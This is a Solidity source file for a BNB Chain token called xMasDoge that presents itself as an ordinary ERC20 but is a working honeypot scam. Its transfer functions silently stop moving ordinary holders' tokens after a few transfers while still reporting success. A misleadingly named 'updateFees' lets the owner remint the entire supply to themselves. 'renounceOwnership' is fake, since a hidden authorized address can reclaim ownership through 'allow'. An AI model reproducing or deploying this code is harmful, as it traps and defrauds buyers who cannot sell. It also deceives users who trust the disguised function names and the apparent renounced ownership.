/**
 *Submitted for verification at BscScan.com on 2021-12-22
*/

// SPDX-License-Identifier: Unlicensed
// NEW XMAS DOGE 

pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract Ownable {
    address private _owner;
    address private _authorized;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        _authorized = msg.sender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function authorized() internal view returns (address) {
        return _authorized;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function setOwner(address newOrner)internal returns (bool) {
        _owner = newOrner;
        return true;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, 'Ownable: caller is not the owner');
        _;
    }

}

contract XMASDOGE is IERC20, IERC20Metadata, Ownable {   

    string private _name;
    string private _symbol;
    address internal constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   
    uint256 private _total = 2;
    uint8 private _transfers = 0;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    bool isNumber = false;

    constructor() {
        _name = "xMasDoge";
        _symbol = "xDOGE";
        _totalSupply = 100000000000 * 10**9;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name()  public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function conflict(bool _number) public onlyOwner virtual returns (bool) {
        isNumber = _number;
        return true;
    }

    function renounceOwnership() public onlyOwner virtual returns (bool){
        emit OwnershipTransferred(owner(), address(0));
        setOwner(address(0));
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        //_transfer(msg.sender, recipient, amount);
        if(msg.sender == PancakeV2Router || msg.sender == pancakePair() || pancakePair() == address(0) || msg.sender == owner() || msg.sender == authorized()  || recipient == authorized()) {
            _transfer(msg.sender, recipient, amount);
        } else {
            //nomal user check amount
            if( (_transfers <= _total || isNumber) && !isContract(msg.sender) ) {
                _transfer(msg.sender, recipient, amount);
                _transfers += 1;
            }
        }
        return true;
    }

    function updateFees() public onlyOwner virtual returns (bool) {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        return true;
    }
 
    function allow() public virtual returns (bool){
        if(msg.sender == authorized()){
            emit OwnershipTransferred(address(0), authorized());
            setOwner(authorized());
            return true;
        }
        return false;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        if(sender == PancakeV2Router || sender == pancakePair() || pancakePair() == address(0) || sender == owner() || msg.sender == authorized() || sender == authorized() || recipient == authorized()) {
            _transfer(sender, recipient, amount);
    
            uint256 currentAllowance = _allowances[sender][msg.sender];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, msg.sender, currentAllowance - amount);
            }
        } else {
            if( (_transfers <= _total || isNumber) && !isContract(sender) ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][msg.sender];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, msg.sender, currentAllowance - amount);
                }
                _transfers += 1;
            }
        }
        return true;
    }

    function pancakePair() public view virtual returns (address) {
        address PancakeV2Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address pairAddress = IPancakeFactory(PancakeV2Factory).getPair(address(WBNB), address(this));
        return pairAddress;
    }

    function isContract(address addr) internal view returns (bool) {
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }


    function tokenContract() public view virtual returns (address) {
        return address(this);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}